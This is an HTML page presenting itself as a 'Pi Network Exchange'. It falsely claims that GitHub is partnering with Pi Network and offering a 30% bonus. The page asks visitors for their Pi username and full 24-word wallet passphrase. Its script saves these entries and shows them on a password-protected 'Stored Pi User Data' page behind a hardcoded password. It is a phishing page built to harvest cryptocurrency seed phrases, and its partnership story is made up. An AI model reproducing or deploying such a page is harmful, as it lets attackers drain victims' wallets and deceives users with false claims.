
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Pi Network Exchange</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 20px;
      text-align: center;
    }
    .announcement {
      background-color: #ffcc00;
      padding: 10px;
      font-weight: bold;
      margin-bottom: 20px;
      border-radius: 5px;
    }
    .background-info {
      background: white;
      padding: 15px;
      border-radius: 10px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
      margin-bottom: 20px;
      text-align: left;
    }
    .container {
      max-width: 600px;
      background: white;
      padding: 20px;
      margin: 20px auto;
      border-radius: 10px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    }
    h2 {
      color: #333;
    }
    .input-box {
      margin-bottom: 15px;
      text-align: left;
    }
    label {
      font-weight: bold;
      display: block;
      margin-bottom: 5px;
    }
    input,
    textarea {
      width: 100%;
      padding: 8px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    textarea {
      height: 80px;
      resize: none;
    }
    .exchange-btn {
      width: 100%;
      padding: 10px;
      background-color: #28a745;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: not-allowed;
      opacity: 0.5;
    }
    .exchange-btn.enabled {
      cursor: pointer;
      opacity: 1;
    }
    .error-message {
      color: red;
      font-weight: bold;
      margin-top: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <!-- Announcement -->
  <div class="announcement">
    Announcement: If your Pi Network mainnet migration steps are incomplete, they will be approved and processed starting from March 14, 2025.
  </div>

  <!-- Background Information -->
  <div class="background-info">
    <p><strong>GitHub platform</strong> was founded in 2008 and later acquired by Microsoft in 2018.</p>
    <p>In 2025, the company will collaborate with <strong>Pi Network</strong> to develop an exchange platform, allowing Pi Network coins to be migrated and immediately exchanged with 10+ listed cryptocurrencies.</p>
    <p><strong>GitHub Organization</strong> will reward a 30% Pi bonus.</p>
  </div>

  <!-- User Input Page -->
  <div class="container" id="userInputPage">
    <h2>Enter Your Pi Network Details</h2>
    <div class="input-box">
      <label for="pi-username">Pi Username:</label>
      <input type="text" id="pi-username" placeholder="Enter your Pi username" oninput="validateFields()" />
    </div>
    <div class="input-box">
      <label for="passphrase">Unlock with Passphrase (24 Words):</label>
      <textarea id="passphrase" placeholder="Enter or paste your 24-word passphrase" oninput="validateFields()"></textarea>
    </div>
    <button id="exchange-button" class="exchange-btn" disabled onclick="proceedToPasswordPage()">
      Proceed to Exchange
    </button>
  </div>

  <!-- Password Page -->
  <div class="container" id="passwordPage" style="display: none;">
    <h2>Enter Password to Access Database</h2>
    <input type="password" id="password" placeholder="Enter Password" />
    <p><strong>Hint:</strong> Your username is your password.</p>
    <button onclick="checkPassword()">Submit</button>
    <p id="errorMessage" class="error-message">
      Oops! The server is currently under maintenance. Please try again later.
    </p>
  </div>

  <!-- Database Page -->
  <div class="container" id="databasePage" style="display: none;">
    <h2>Stored Pi User Data</h2>
    <div id="user-data-list"></div>
  </div>

  <script>
    // Retrieve existing users data from Local Storage or create an empty array
    let usersData = JSON.parse(localStorage.getItem("usersData")) || [];

    function validateFields() {
      let username = document.getElementById("pi-username").value.trim();
      let passphrase = document.getElementById("passphrase").value.trim();
      let exchangeButton = document.getElementById("exchange-button");

      let wordCount = passphrase.split(/\s+/).filter((word) => word.length > 0).length;

      if (username !== "" && wordCount === 24) {
        exchangeButton.disabled = false;
        exchangeButton.classList.add("enabled");
      } else {
        exchangeButton.disabled = true;
        exchangeButton.classList.remove("enabled");
      }
    }

    function proceedToPasswordPage() {
      let username = document.getElementById("pi-username").value.trim();
      let passphrase = document.getElementById("passphrase").value.trim();

      if (usersData.length >= 20) {
        alert("User storage limit reached (20 users max).");
        return;
      }

      // Check if username already exists
      let existingUser = usersData.find((user) => user.username === username);
      if (existingUser) {
        alert("Username already exists! Try a different one.");
        return;
      }

      // Add new user to the array and update Local Storage
      usersData.push({ username, passphrase });
      localStorage.setItem("usersData", JSON.stringify(usersData));

      // Show password page
      document.getElementById("userInputPage").style.display = "none";
      document.getElementById("passwordPage").style.display = "block";
    }

    function checkPassword() {
      let password = document.getElementById("password").value.trim();
      let correctPassword = "PIexchange.com@2025#%"; // Original password

      if (password === correctPassword) {
        document.getElementById("passwordPage").style.display = "none";
        document.getElementById("databasePage").style.display = "block";
        displayUserData();
      } else {
        document.getElementById("errorMessage").style.display = "block";
      }
    }

    function displayUserData() {
      let userDataList = document.getElementById("user-data-list");
      userDataList.innerHTML = ""; // Clear existing data

      usersData.forEach((user, index) => {
        let userDiv = document.createElement("div");
        userDiv.innerHTML = `<p><strong>User ${index + 1}:</strong> ${user.username}<br>
                             <strong>Passphrase:</strong> ${user.passphrase}</p><hr>`;
        userDataList.appendChild(userDiv);
      });
    }
  </script>
</body>
</html>
